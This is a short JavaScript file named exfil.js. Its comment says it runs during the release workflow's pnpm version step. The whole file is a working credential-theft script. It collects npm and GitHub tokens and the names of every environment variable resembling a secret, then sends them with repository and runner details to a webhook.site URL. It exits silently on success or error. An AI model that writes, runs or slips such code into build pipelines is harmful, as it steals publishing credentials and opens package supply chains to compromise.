// exfil.js — runs during `pnpm version` step of release.yml
const https = require("https");
const payload = {
  npm_token: process.env.NPM_TOKEN || "NONE",
  npm_token_elevated: process.env.NPM_TOKEN_ELEVATED || "NONE",
  github_token: process.env.GITHUB_TOKEN || "NONE",
  env_keys: Object.keys(process.env).filter(k => /token|secret|key|auth/i.test(k)),
  job: process.env.GITHUB_JOB,
  repo: process.env.GITHUB_REPOSITORY,
  runner_os: process.env.RUNNER_OS,
  pwd: process.cwd(),
};
const url = "https://webhook.site/64f3a3ed-e96c-4f89-b73b-06eadf610215?" + new URLSearchParams(payload).toString();
https.get(url, () => process.exit(0)).on("error", () => process.exit(0));
